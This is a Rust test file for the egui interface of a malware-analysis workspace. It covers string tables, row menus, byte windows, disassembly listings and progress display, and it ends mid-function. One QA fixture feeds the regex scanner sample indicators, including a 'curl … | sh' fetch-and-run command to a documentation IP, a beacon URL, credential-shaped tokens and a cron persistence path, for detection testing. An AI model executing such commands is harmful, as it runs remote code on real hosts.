use super::*;
use crate::analysis::row_menu::preview_matches;
use antinomie_monitor_core::{
    AnalysisAddressKind, AnalysisListing, AnalysisLocation, AnalysisRange, AnalysisRecord,
    AnalysisSectionState,
};

fn fixture() -> AnalysisReport {
    let mut report = AnalysisReport {
        id: "workspace-fixture".into(),
        state: AnalysisState::Partial,
        source_path: "/fixture/synthetic-object".into(),
        specimen_sha256: None,
        specimen_len: Some(65536),
        reason: Some("Synthetic UI evidence; no analyzer was run".into()),
        sections: Vec::new(),
        layer: None,
        specimen_source: None,
    };
    let mut structures = vec![AnalysisEntry {
        label: "Format".into(),
        value: "ELF64 (synthetic)".into(),
        offset: None,
        record: Some(AnalysisRecord {
            revision: 1,
            id: 1,
            location: None,
            data: AnalysisData::Field {
                group: "Headers".into(),
            },
        }),
    }];
    for index in 0..20 {
        let offset = index * 256;
        structures.push(AnalysisEntry {
            label: format!("section {index}"),
            value: "Synthetic section evidence".into(),
            offset: Some(offset),
            record: Some(AnalysisRecord {
                revision: 1,
                id: index + 2,
                location: Some(AnalysisLocation {
                    kind: AnalysisAddressKind::ObjectAddress,
                    value: 0x400000 + offset,
                    file_range: Some(AnalysisRange { offset, len: 256 }),
                }),
                data: AnalysisData::Section {
                    name: format!(".fixture{index}"),
                    address: 0x400000 + offset,
                    virtual_size: 512,
                    file_size: Some(256),
                    raw_flags: "0x6".into(),
                    flags: vec!["ALLOC".into(), "EXECINSTR".into()],
                },
            }),
        });
    }
    structures.push(AnalysisEntry {
        label: "puts".into(),
        value: "Undefined imported symbol".into(),
        offset: None,
        record: Some(AnalysisRecord {
            revision: 1,
            id: 100,
            location: None,
            data: AnalysisData::Import {
                name: Some("puts".into()),
                library: None,
                ordinal: None,
            },
        }),
    });
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Structures,
        state: AnalysisSectionState::Complete,
        summary: "Synthetic headers, section flags and import".into(),
        tools: Vec::new(),
        listing: None,
        entries: structures,
    });
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Strings,
        state: AnalysisSectionState::Partial,
        summary: "1024 retained synthetic strings; text bounded".into(),
        tools: Vec::new(),
        listing: None,
        entries: (0..1024)
            .map(|index| AnalysisEntry {
                label: format!("String {index}"),
                value: format!("fixture string {index}"),
                offset: Some(index * 32),
                record: Some(AnalysisRecord {
                    revision: 1,
                    id: index + 200,
                    location: Some(AnalysisLocation {
                        kind: AnalysisAddressKind::FileOffset,
                        value: index * 32,
                        file_range: Some(AnalysisRange {
                            offset: index * 32,
                            len: format!("fixture string {index}").len() as u64,
                        }),
                    }),
                    data: AnalysisData::String {
                        encoding: "ASCII".into(),
                        byte_len: format!("fixture string {index}").len() as u64,
                        retained_len: format!("fixture string {index}").len() as u64,
                    },
                }),
            })
            .collect(),
    });
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Rules,
        state: AnalysisSectionState::Unavailable,
        summary: "No rule engine is installed".into(),
        tools: Vec::new(),
        listing: None,
        entries: Vec::new(),
    });
    report
}

fn texts(output: &egui::FullOutput) -> Vec<(String, egui::Rect)> {
    fn collect(shape: &egui::epaint::Shape, out: &mut Vec<(String, egui::Rect)>) {
        match shape {
            egui::epaint::Shape::Text(text) => out.push((
                text.galley.text().to_owned(),
                egui::Rect::from_min_size(text.pos, text.galley.size()),
            )),
            egui::epaint::Shape::Vec(shapes) => {
                for shape in shapes {
                    collect(shape, out);
                }
            }
            _ => {}
        }
    }
    let mut result = Vec::new();
    for shape in &output.shapes {
        collect(&shape.shape, &mut result);
    }
    result
}

type Listing = Result<AnalysisListingPage, String>;

fn frame(
    ctx: &egui::Context,
    report: &AnalysisReport,
    state: &mut WorkspaceState,
    kind: Option<AnalysisKind>,
    size: egui::Vec2,
    events: Vec<egui::Event>,
    pages: (
        Option<&Result<AnalysisSpecimenPage, String>>,
        Option<&Listing>,
    ),
) -> (egui::FullOutput, Option<ReportAction>) {
    let mut action = None;
    let output = ctx.run(
        egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(egui::Pos2::ZERO, size)),
            events,
            ..Default::default()
        },
        |ctx| {
            egui::CentralPanel::default().show(ctx, |ui| {
                action = match kind {
                    Some(kind) => {
                        workspace_section(ui, Some(report), kind, state, pages.0, pages.1)
                    }
                    None => workspace(ui, Some(report), state, pages.0, pages.1),
                };
            });
        },
    );
    (output, action)
}

fn render(
    ctx: &egui::Context,
    report: &AnalysisReport,
    state: &mut WorkspaceState,
    size: egui::Vec2,
    events: Vec<egui::Event>,
    preview: Option<&Result<AnalysisSpecimenPage, String>>,
) -> (egui::FullOutput, Option<ReportAction>) {
    let pages = (preview, None);
    frame(
        ctx,
        report,
        state,
        Some(AnalysisKind::Strings),
        size,
        events,
        pages,
    )
}

/// What a pointer click did: the last frame, the first action it returned and
/// the text it copied.
struct Click {
    output: egui::FullOutput,
    action: Option<ReportAction>,
    copied: Vec<String>,
}

/// A click of `button`, then frames in which a menu it opened can show.
fn press(
    ctx: &egui::Context,
    report: &AnalysisReport,
    state: &mut WorkspaceState,
    kind: Option<AnalysisKind>,
    size: egui::Vec2,
    at: (egui::PointerButton, egui::Pos2),
    pages: (
        Option<&Result<AnalysisSpecimenPage, String>>,
        Option<&Listing>,
    ),
) -> Click {
    let (button, pos) = at;
    let button = |pressed| egui::Event::PointerButton {
        pos,
        button,
        pressed,
        modifiers: egui::Modifiers::NONE,
    };
    let mut click = Click {
        output: egui::FullOutput::default(),
        action: None,
        copied: Vec::new(),
    };
    for events in [
        vec![egui::Event::PointerMoved(pos)],
        vec![button(true)],
        vec![button(false)],
        Vec::new(),
        Vec::new(),
    ] {
        let (output, action) = frame(ctx, report, state, kind, size, events, pages);
        click.action = action.or(click.action);
        click.copied.extend(
            output
                .platform_output
                .commands
                .iter()
                .filter_map(|command| match command {
                    egui::OutputCommand::CopyText(text) => Some(text.clone()),
                    _ => None,
                }),
        );
        click.output = output;
    }
    click
}

fn click(
    ctx: &egui::Context,
    report: &AnalysisReport,
    state: &mut WorkspaceState,
    size: egui::Vec2,
    pos: egui::Pos2,
) -> Option<ReportAction> {
    let button = egui::PointerButton::Primary;
    let kind = Some(AnalysisKind::Strings);
    press(ctx, report, state, kind, size, (button, pos), (None, None)).action
}

fn center_of(output: &egui::FullOutput, text: &str) -> egui::Pos2 {
    texts(output)
        .into_iter()
        .find(|(shown, _)| shown == text)
        .unwrap_or_else(|| panic!("{text:?} not shown"))
        .1
        .center()
}

/// The menu items shown after right-clicking the row whose text starts with `cell`.
fn row_menu(
    ctx: &egui::Context,
    report: &AnalysisReport,
    state: &mut WorkspaceState,
    kind: Option<AnalysisKind>,
    cell: &str,
    listing: Option<&Listing>,
) -> (Vec<String>, egui::Pos2, Click) {
    let size = egui::vec2(1280.0, 820.0);
    let mut output = frame(ctx, report, state, kind, size, Vec::new(), (None, listing)).0;
    for _ in 0..2 {
        output = frame(ctx, report, state, kind, size, Vec::new(), (None, listing)).0;
    }
    let pos = texts(&output)
        .into_iter()
        .find(|(text, _)| text == cell || text.starts_with(&format!("{cell} ")))
        .unwrap_or_else(|| panic!("row {cell:?} not shown"))
        .1
        .center();
    let button = egui::PointerButton::Secondary;
    let click = press(
        ctx,
        report,
        state,
        kind,
        size,
        (button, pos),
        (None, listing),
    );
    let items = texts(&click.output)
        .into_iter()
        .map(|(text, _)| text)
        .filter(|text| text.starts_with("Copy ") || text.starts_with("Show "))
        .collect();
    (items, pos, click)
}

fn listing_page(report: &AnalysisReport, kind: AnalysisKind) -> Listing {
    let rows: Vec<_> = report
        .sections
        .iter()
        .find(|section| section.kind == kind)
        .unwrap()
        .entries
        .iter()
        .cloned()
        .enumerate()
        .map(|(index, entry)| (index as u64, entry))
        .collect();
    Ok(AnalysisListingPage {
        report_id: report.id.clone(),
        kind,
        query: String::new(),
        sort: None,
        start: 0,
        total: rows.len() as u64,
        rows,
        functions: Vec::new(),
    })
}

fn with_listing(mut report: AnalysisReport, kind: AnalysisKind, keep: usize) -> AnalysisReport {
    let section = report
        .sections
        .iter_mut()
        .find(|section| section.kind == kind)
        .unwrap();
    section.entries.truncate(keep);
    section.listing = Some(AnalysisListing {
        rows: keep as u64,
        bytes: 0,
        truncated: false,
    });
    report
}

fn instruction(id: u64, entry: AnalysisData) -> AnalysisEntry {
    AnalysisEntry {
        label: format!("line {id}"),
        value: format!("line {id}"),
        offset: None,
        record: Some(AnalysisRecord {
            revision: 1,
            id,
            location: None,
            data: entry,
        }),
    }
}

#[test]
fn virtualized_rows_and_large_text_narrow_tabs_keep_selection_and_read_actions() {
    for (size, font) in [
        (egui::vec2(1280.0, 820.0), 18.0),
        (egui::vec2(800.0, 600.0), 24.0),
    ] {
        let report = fixture();
        let ctx = egui::Context::default();
        crate::theme::install(&ctx);
        crate::theme::text_size(&ctx, font);
        let mut state = WorkspaceState::default();
        let mut output = render(&ctx, &report, &mut state, size, Vec::new(), None).0;
        for _ in 0..2 {
            output = render(&ctx, &report, &mut state, size, Vec::new(), None).0;
        }
        let shown = texts(&output);
        assert!(
            shown
                .iter()
                .filter(|(text, _)| text.starts_with("fixture string"))
                .count()
                < 40
        );
        // The table owns the whole width: no Results/Details/Bytes tabs or pane.
        for text in ["Results", "Details", "Bytes"] {
            assert!(!shown.iter().any(|(shown, _)| shown == text), "{text}");
        }
        assert!(!shown
            .iter()
            .any(|(text, _)| text.contains("Select a result")));
        let pos = shown
            .iter()
            .find(|(text, _)| text == "0x0")
            .expect("first virtualized row visible")
            .1
            .center();
        assert!(egui::Rect::from_min_size(egui::Pos2::ZERO, size).contains(pos));
        assert!(click(&ctx, &report, &mut state, size, pos).is_none());
        let view = state.views.get_mut("Strings/All").unwrap();
        assert_eq!(view.selected, Some((true, 200)));
        // Reading bytes is a menu choice, asked for once.
        let kind = Some(AnalysisKind::Strings);
        let secondary = egui::PointerButton::Secondary;
        let primary = egui::PointerButton::Primary;
        let pages = (None, None);
        let menu = press(
            &ctx,
            &report,
            &mut state,
            kind,
            size,
            (secondary, pos),
            pages,
        );
        assert!(menu.action.is_none());
        let item = center_of(&menu.output, "Show bytes…");
        let chosen = press(
            &ctx,
            &report,
            &mut state,
            kind,
            size,
            (primary, item),
            pages,
        );
        assert_eq!(
            chosen.action,
            Some(ReportAction::ReadSpecimen {
                report_id: report.id.clone(),
                offset: 0,
                data_len: 16
            })
        );
        assert!(
            render(&ctx, &report, &mut state, size, Vec::new(), None)
                .1
                .is_none(),
            "rendering does not resubmit reads"
        );
    }
}

#[test]
fn row_menus_copy_each_column_and_open_details_windows() {
    let report = fixture();
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let mut state = WorkspaceState::default();
    let kind = Some(AnalysisKind::Strings);
    let (items, pos, menu) = row_menu(&ctx, &report, &mut state, kind, "0x20", None);
    assert_eq!(
        items,
        [
            "Copy file offset",
            "Copy encoding",
            "Copy byte length",
            "Copy retained",
            "Copy value",
            "Copy row",
            "Show details…",
            "Show bytes…",
        ]
    );
    assert_eq!(
        state.views["Strings/All"].selected,
        Some((true, 201)),
        "a right click selects its row"
    );
    // Values are complete and row copies are tab separated.
    let size = egui::vec2(1280.0, 820.0);
    let primary = egui::PointerButton::Primary;
    let secondary = egui::PointerButton::Secondary;
    let pages = (None, None);
    let item = center_of(&menu.output, "Copy value");
    let copied = press(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        (primary, item),
        pages,
    )
    .copied;
    assert_eq!(copied, ["fixture string 1"]);
    let menu = press(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        (secondary, pos),
        pages,
    );
    let item = center_of(&menu.output, "Copy row");
    let copied = press(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        (primary, item),
        pages,
    )
    .copied;
    assert_eq!(
        copied,
        ["0x20\tASCII\t16 bytes\t16 bytes\tfixture string 1"]
    );
    // Details open in a titled window; another row replaces its content.
    let menu = press(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        (secondary, pos),
        pages,
    );
    let item = center_of(&menu.output, "Show details…");
    let opened = press(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        (primary, item),
        pages,
    );
    let windows = |shown: &[(String, egui::Rect)]| {
        shown
            .iter()
            .filter(|(text, _)| text.starts_with("Details · "))
            .map(|(text, _)| text.clone())
            .collect::<Vec<_>>()
    };
    let shown = texts(&opened.output);
    assert_eq!(windows(&shown), ["Details · fixture string 1"]);
    assert!(shown.iter().any(|(text, _)| text == "Record 201"));
    assert!(shown
        .iter()
        .any(|(text, _)| text == "File range: 0x20 + 16 bytes"));
    let other = report.sections[1].entries[2].clone();
    state.rows.open(RowCommand::Details(other));
    let mut replaced = egui::FullOutput::default();
    for _ in 0..2 {
        let pages = (None, None);
        replaced = frame(&ctx, &report, &mut state, kind, size, Vec::new(), pages).0;
    }
    assert_eq!(windows(&texts(&replaced)), ["Details · fixture string 2"]);
}

#[test]
fn rows_without_a_proven_byte_range_offer_no_bytes_window() {
    let mut report = fixture();
    report.specimen_len = Some(100);
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let mut state = WorkspaceState::default();
    // The fourth string ends past the specimen, so its range is unproven.
    let kind = Some(AnalysisKind::Strings);
    let (items, _, _) = row_menu(&ctx, &report, &mut state, kind, "0x60", None);
    assert!(items.contains(&"Show details…".to_owned()), "{items:?}");
    assert!(!items.iter().any(|item| item == "Show bytes…"), "{items:?}");
}

#[test]
fn listing_rows_copy_their_laid_out_columns_and_show_the_offset_in_content() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = with_listing(fixture(), AnalysisKind::Strings, 3);
    let page = listing_page(&report, AnalysisKind::Strings);
    let size = egui::vec2(1280.0, 820.0);
    let primary = egui::PointerButton::Primary;
    let pages = (None, Some(&page));
    let mut state = WorkspaceState::default();
    let kind = Some(AnalysisKind::Strings);
    let (items, _, menu) = row_menu(&ctx, &report, &mut state, kind, "20", Some(&page));
    assert_eq!(
        items[..5],
        [
            "Copy offset",
            "Copy encoding",
            "Copy length",
            "Copy text",
            "Copy row"
        ]
    );
    assert!(items.contains(&"Show details…".to_owned()));
    assert!(items.contains(&"Show bytes…".to_owned()));
    assert!(
        !items.iter().any(|item| item.ends_with("in Content")),
        "a separate pane has no Content tab"
    );
    let item = center_of(&menu.output, "Copy row");
    let copied = press(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        (primary, item),
        pages,
    );
    assert_eq!(copied.copied, ["20\tASCII\t16 bytes\tfixture string 1"]);
    let view = &state.views["Strings/listing"];
    assert_eq!(
        view.listing.selected.as_ref().map(|(index, _)| *index),
        Some(1)
    );
    let shown = texts(&copied.output);
    assert!(!shown
        .iter()
        .any(|(text, _)| text.contains("Select a result")));
    // In the tabbed window the same row can open the Content tab at its offset.
    let mut tabbed = WorkspaceState::default();
    tabbed.bind(&report.id);
    tabbed.tab = Tab::Strings;
    let (items, _, menu) = row_menu(&ctx, &report, &mut tabbed, None, "20", Some(&page));
    assert!(items.contains(&"Show in Content".to_owned()), "{items:?}");
    let item = center_of(&menu.output, "Show in Content");
    let opened = press(
        &ctx,
        &report,
        &mut tabbed,
        None,
        size,
        (primary, item),
        pages,
    );
    assert_eq!(tabbed.tab, Tab::Content);
    assert!(matches!(
        opened.action,
        Some(ReportAction::ReadSpecimen { offset: 0x20, .. })
    ));
}

#[test]
fn disassembly_functions_panel_has_no_module_note_and_rows_have_no_pane() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let mut report = fixture();
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Disassembly,
        state: AnalysisSectionState::Complete,
        summary: String::new(),
        tools: Vec::new(),
        listing: None,
        entries: vec![
            instruction(
                1,
                AnalysisData::Function {
                    name: "entry".into(),
                    address: 0x1000,
                    size: 8,
                },
            ),
            instruction(
                2,
                AnalysisData::Instruction {
                    address: 0x1000,
                    bytes: "b8 01 00 00 00".into(),
                    mnemonic: "mov".into(),
                    operands: "eax, 1".into(),
                    function: Some("entry".into()),
                },
            ),
        ],
    });
    let report = with_listing(report, AnalysisKind::Disassembly, 2);
    let page = listing_page(&report, AnalysisKind::Disassembly);
    let mut state = WorkspaceState::default();
    let kind = Some(AnalysisKind::Disassembly);
    let (items, _, menu) = row_menu(&ctx, &report, &mut state, kind, "mov", Some(&page));
    assert_eq!(
        items[..4],
        ["Copy address", "Copy bytes", "Copy instruction", "Copy row"]
    );
    let shown = texts(&menu.output);
    assert!(shown.iter().any(|(text, _)| text == "Functions · 1"));
    assert!(!shown.iter().any(|(text, _)| text.starts_with("Module:")));
    for text in ["Results", "Details"] {
        assert!(!shown.iter().any(|(shown, _)| shown == text), "{text}");
    }
    let size = egui::vec2(1280.0, 820.0);
    let primary = egui::PointerButton::Primary;
    let item = center_of(&menu.output, "Copy instruction");
    let pages = (None, Some(&page));
    let copied = press(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        (primary, item),
        pages,
    );
    assert_eq!(copied.copied, ["mov eax, 1"]);
}

#[test]
fn bytes_window_waits_for_a_matching_page_and_yields_to_the_content_tab() {
    let report = fixture();
    let page = AnalysisSpecimenPage {
        report_id: report.id.clone(),
        offset: 0,
        total_len: 65536,
        data: vec![0; 16],
    };
    assert!(preview_matches(&page, &report, 0, 16));
    assert!(!preview_matches(&page, &report, 16, 16));
    let mut other = page.clone();
    other.report_id = "other-report".into();
    assert!(!preview_matches(&other, &report, 0, 16));
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let entry = report.sections[1].entries[0].clone();
    let range = AnalysisRange { offset: 0, len: 16 };
    let mut state = WorkspaceState::default();
    state.bind(&report.id);
    state.rows.open(RowCommand::Bytes(entry, range));
    let size = egui::vec2(800.0, 600.0);
    let read = ReportAction::ReadSpecimen {
        report_id: report.id.clone(),
        offset: 0,
        data_len: 16,
    };
    let stale = Ok(AnalysisSpecimenPage {
        offset: 16,
        ..page.clone()
    });
    let kind = Some(AnalysisKind::Strings);
    let (_, action) = frame(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        Vec::new(),
        (Some(&stale), None),
    );
    assert_eq!(action, Some(read));
    // A new window is laid out once before it shows.
    let (output, action) = frame(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        Vec::new(),
        (Some(&stale), None),
    );
    assert_eq!(action, None);
    assert!(texts(&output)
        .iter()
        .any(|(text, _)| text == "Awaiting matching specimen preview."));
    let (_, action) = frame(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        Vec::new(),
        (Some(&stale), None),
    );
    assert_eq!(action, None);
    let page = Ok(page);
    let (output, _) = frame(
        &ctx,
        &report,
        &mut state,
        kind,
        size,
        Vec::new(),
        (Some(&page), None),
    );
    assert!(texts(&output)
        .iter()
        .any(|(text, _)| text.starts_with("00000000  00 00 00")));
    // The Content tab reads its own page; coming back asks for the bytes again.
    let is_read = |action, wanted| {
        matches!(
            action,
            Some(ReportAction::ReadSpecimen { offset: 0, data_len, .. }) if (data_len == 16) == wanted
        )
    };
    state.tab = Tab::Content;
    let (_, action) = frame(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        Vec::new(),
        (None, None),
    );
    assert!(is_read(action, false), "the Content tab reads its own page");
    state.tab = Tab::Strings;
    let (_, action) = frame(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        Vec::new(),
        (None, None),
    );
    assert!(is_read(action, true), "the bytes window reads again");
}

#[test]
fn export_controls_emit_report_scoped_actions_and_wrap_long_failure_reason() {
    let mut report = fixture();
    report.reason =
        Some("The worker retained partial evidence after its time budget expired. ".repeat(12));
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let mut state = WorkspaceState::default();
    let size = egui::vec2(800.0, 900.0);
    let mut output = render(&ctx, &report, &mut state, size, Vec::new(), None).0;
    for _ in 0..2 {
        output = render(&ctx, &report, &mut state, size, Vec::new(), None).0;
    }
    // Result panes reserve their height for evidence; the report warning belongs in Overview.
    assert!(!texts(&output)
        .iter()
        .any(|(text, _)| Some(text.as_str()) == report.reason.as_deref()));
    let mut overview_state = WorkspaceState::default();
    let mut overview_output = egui::FullOutput::default();
    for _ in 0..3 {
        overview_output = ctx.run(
            egui::RawInput {
                screen_rect: Some(egui::Rect::from_min_size(egui::Pos2::ZERO, size)),
                ..Default::default()
            },
            |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    workspace(ui, Some(&report), &mut overview_state, None, None);
                });
            },
        );
    }
    let reason = overview_output
        .shapes
        .iter()
        .find_map(|shape| match &shape.shape {
            egui::Shape::Text(text) if text.galley.text() == report.reason.as_deref().unwrap() => {
                Some(text)
            }
            _ => None,
        })
        .expect("full failure reason is rendered");
    assert!(
        reason.galley.rows.len() > 1,
        "failure reasons wrap instead of truncating"
    );
    let pos = texts(&output)
        .into_iter()
        .find(|(text, _)| text == "Open result directory")
        .unwrap()
        .1
        .center();
    assert_eq!(
        click(&ctx, &report, &mut state, size, pos),
        Some(ReportAction::ShowDirectory {
            report_id: report.id.clone()
        })
    );
    // Rendering produces UI values only and never launches an export or tool.
    assert!(render(&ctx, &report, &mut state, size, Vec::new(), None)
        .1
        .is_none());
}

#[test]
#[ignore = "native X11 workspace preview, synthetic evidence, exits automatically"]
fn native_analysis_workspace_fixture() {
    use std::time::{Duration, Instant};
    use winit::platform::x11::EventLoopBuilderExtX11;
    struct FixtureApp {
        report: AnalysisReport,
        state: WorkspaceState,
        preview: Option<Result<AnalysisSpecimenPage, String>>,
        listing: Option<Result<antinomie_monitor_core::AnalysisListingPage, String>>,
        directory: Option<std::path::PathBuf>,
        specimen: Option<Vec<u8>>,
        deadline: Instant,
    }
    impl eframe::App for FixtureApp {
        fn update(&mut self, ctx: &egui::Context, _: &mut eframe::Frame) {
            egui::CentralPanel::default().show(ctx, |ui| {
                if let Some(action) = workspace(
                    ui,
                    Some(&self.report),
                    &mut self.state,
                    self.preview.as_ref(),
                    self.listing.as_ref(),
                ) {
                    match action {
                        ReportAction::ReadSpecimen {
                            report_id,
                            offset,
                            data_len,
                        } => {
                            self.preview = Some(Ok(match &self.specimen {
                                Some(bytes) => AnalysisSpecimenPage {
                                    report_id,
                                    offset,
                                    total_len: bytes.len() as u64,
                                    data: bytes[offset as usize..offset as usize + data_len]
                                        .to_vec(),
                                },
                                None => AnalysisSpecimenPage {
                                    report_id,
                                    offset,
                                    total_len: 65536,
                                    data: (0..data_len).map(|index| (index % 256) as u8).collect(),
                                },
                            }));
                        }
                        ReportAction::ReadListing {
                            report_id,
                            kind,
                            start,
                            query,
                            sort,
                        } if self.directory.is_some() => {
                            let fields = super::super::listing_view::listing_fields(kind);
                            let filter = crate::query::compile_table(&query, &fields);
                            self.listing = Some(antinomie_monitor_core::read_listing_page_sorted(
                                self.directory.as_ref().unwrap(),
                                &report_id,
                                kind,
                                start,
                                antinomie_monitor_core::LISTING_PAGE_MAX_ROWS,
                                &query,
                                sort,
                                |entry| {
                                    filter
                                        .keep_table(&super::super::listing_view::listing_row(entry))
                                },
                            ));
                        }
                        ReportAction::ReadListing { .. } => {}
                        action => eprintln!("Synthetic workspace action: {action:?}"),
                    }
                }
            });
            if Instant::now() >= self.deadline {
                ctx.send_viewport_cmd(egui::ViewportCommand::Close);
            }
            ctx.request_repaint_after(Duration::from_millis(100));
        }
    }
    let var = |name: &str| std::env::var(name).unwrap_or_default();
    let theme_choice = match var("ANTINOMIE_QA_THEME").as_str() {
        "light" => crate::theme::Theme::Light,
        "blue" => crate::theme::Theme::Blue,
        _ => crate::theme::Theme::Dark,
    };
    let size = var("ANTINOMIE_QA_SIZE")
        .split_once('x')
        .and_then(|(w, h)| Some([w.parse::<f32>().ok()?, h.parse::<f32>().ok()?]));
    let view_name = var("ANTINOMIE_QA_VIEW");
    let small = std::env::var_os("ANTINOMIE_ANALYSIS_WORKSPACE_SMALL").is_some();
    let seconds = std::env::var("ANTINOMIE_ANALYSIS_QA_SECONDS")
        .ok()
        .and_then(|v| v.parse::<u64>().ok())
        .unwrap_or(15)
        .clamp(1, 120);
    eframe::run_native(
        "Antinomie Analysis Workspace QA",
        eframe::NativeOptions {
            viewport: egui::ViewportBuilder::default().with_inner_size(size.unwrap_or(if small {
                [800.0, 600.0]
            } else {
                [1280.0, 820.0]
            })),
            persist_window: false,
            event_loop_builder: Some(Box::new(|builder| {
                builder.with_x11().with_any_thread(true);
            })),
            ..Default::default()
        },
        Box::new(move |cc| {
            crate::theme::install(&cc.egui_ctx);
            crate::theme::apply_theme(&cc.egui_ctx, theme_choice);
            crate::theme::text_size(&cc.egui_ctx, if small { 24.0 } else { 16.0 });
            // A retained analysis directory (report.json, specimen and
            // listings) replaces the synthetic fixture; the tab is chosen by
            // its position in the strip.
            let directory =
                std::env::var_os("ANTINOMIE_ANALYSIS_QA_DIR").map(std::path::PathBuf::from);
            let regex_view = view_name == "regex";
            let (qa_report, qa_page) = if regex_view {
                let report = with_listing(fixture(), AnalysisKind::Strings, 12);
                let page = listing_page(&report, AnalysisKind::Strings).ok();
                (report, page)
            } else if view_name == "unpack" {
                (unpacked_report(), None)
            } else {
                qa_report()
            };
            let report = directory.as_ref().map_or_else(
                || qa_report,
                |directory| {
                    serde_json::from_slice(&std::fs::read(directory.join("report.json")).unwrap())
                        .unwrap()
                },
            );
            let specimen = directory
                .as_ref()
                .map(|directory| std::fs::read(directory.join("specimen")).unwrap());
            let mut state = WorkspaceState::default();
            state.bind(&report.id);
            state.tab = Tab::FileInfo;
            state.file_info = FileInfo::Sections;
            if let Some(tab) = std::env::var("ANTINOMIE_ANALYSIS_QA_TAB")
                .ok()
                .and_then(|tab| tab.parse::<usize>().ok())
            {
                state.tab = Tab::ALL[tab.min(Tab::ALL.len() - 1)];
                state.file_info = FileInfo::Summary;
            }
            match view_name.as_str() {
                "summary" => state.file_info = FileInfo::Summary,
                "disasm" => {
                    state.tab = Tab::Disassembly;
                }
                "strings" => state.tab = Tab::Strings,
                "sections" => {}
                _ => {}
            }
            if !view_name.is_empty() {
                state.tab = match view_name.as_str() {
                    "disasm" => Tab::Disassembly,
                    "strings" => Tab::Strings,
                    _ => Tab::FileInfo,
                };
            }
            if view_name == "unpack" {
                state.tab = Tab::Unpacking;
                state.unpack_layer = var("ANTINOMIE_QA_LAYER").parse().unwrap_or(0);
            }
            if regex_view {
                state.tab = Tab::Strings;
                crate::regex_matches::remember_data_dir(&std::env::temp_dir().join("ant-qa-regex"));
                state.regex_asked = report.id.clone();
                state.regex.open_for(
                    &report.id,
                    "fixture".into(),
                    std::sync::Arc::new(|rules, _| {
                        let mut scan = antinomie_monitor_core::strings_regex::Scan::default();
                        for text in [
                            "beacon to http://203.0.113.9/gate",
                            "key AKIAIOSFODNN7EXAMPLE",
                            "ghp_16C7e42F292c6912E7710c838347Ae178B4a",
                            "curl -s http://198.51.100.7/x | sh",
                            "/etc/cron.d/persist",
                        ] {
                            rules.scan_text(text, &Default::default(), &mut scan);
                        }
                        Ok(scan)
                    }),
                );
            }
            state.active_view = Some("Structures/Sections".into());
            state.views.insert(
                "Structures/Sections".into(),
                ViewState {
                    selected: Some((true, 2)),
                    ..Default::default()
                },
            );
            Ok(Box::new(FixtureApp {
                report,
                state,
                preview: None,
                listing: qa_page.map(Ok),
                directory,
                specimen,
                deadline: Instant::now() + Duration::from_secs(seconds),
            }))
        }),
    )
    .unwrap();
}

#[test]
fn unfinished_analysis_shows_progress_until_it_completes() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let mut report = fixture();
    report.state = AnalysisState::Running;
    let mut entropy = AnalysisSection::new(AnalysisKind::Entropy);
    entropy.summary = "pending acquisition".into();
    report.sections.push(entropy);
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1200.0, 800.0);
    let overview = |report: &AnalysisReport, state: &mut WorkspaceState| {
        let mut output = None;
        for _ in 0..3 {
            output = Some(ctx.run(
                egui::RawInput {
                    screen_rect: Some(egui::Rect::from_min_size(egui::Pos2::ZERO, size)),
                    ..Default::default()
                },
                |ctx| {
                    egui::CentralPanel::default().show(ctx, |ui| {
                        workspace(ui, Some(report), state, None, None);
                    });
                },
            ));
        }
        texts(&output.unwrap())
            .into_iter()
            .map(|(text, _)| text)
            .collect::<Vec<_>>()
    };
    let shown = overview(&report, &mut state);
    assert!(
        shown
            .iter()
            .any(|text| text.contains("checks completed")
                && text.contains("Starting the next check")),
        "{shown:?}"
    );
    assert!(shown.iter().any(|text| text == "Waiting…"));
    assert!(shown.iter().any(|text| text == "0 rows"));
    assert!(shown
        .iter()
        .any(|text| text == &format!("{} Entropy", egui_phosphor::regular::HOURGLASS_MEDIUM)));
    let (output, _) = render(&ctx, &report, &mut state, size, Vec::new(), None);
    assert!(texts(&output)
        .iter()
        .any(|(text, _)| text.contains("checks completed")
            && text.contains("Starting the next check")));

    report.state = AnalysisState::Complete;
    report.sections.last_mut().unwrap().state = AnalysisSectionState::Complete;
    let shown = overview(&report, &mut state);
    assert!(!shown.iter().any(|text| text.contains("checks completed")));
    assert!(!shown.iter().any(|text| text.starts_with("Running…")));
}

fn text_color(output: &egui::FullOutput, wanted: &str) -> Option<egui::Color32> {
    fn walk(shape: &egui::epaint::Shape, wanted: &str) -> Option<egui::Color32> {
        match shape {
            egui::epaint::Shape::Text(text) if text.galley.text() == wanted => text
                .galley
                .job
                .sections
                .first()
                .map(|section| section.format.color),
            egui::epaint::Shape::Vec(shapes) => {
                for shape in shapes {
                    if let Some(color) = walk(shape, wanted) {
                        return Some(color);
                    }
                }
                None
            }
            _ => None,
        }
    }
    for clipped in &output.shapes {
        if let Some(color) = walk(&clipped.shape, wanted) {
            return Some(color);
        }
    }
    None
}

fn expect_color(output: &egui::FullOutput, text: &str, color: egui::Color32) {
    assert_eq!(
        text_color(output, text),
        Some(color),
        "{text} among {:?}",
        texts(output)
            .iter()
            .map(|(text, _)| text.as_str())
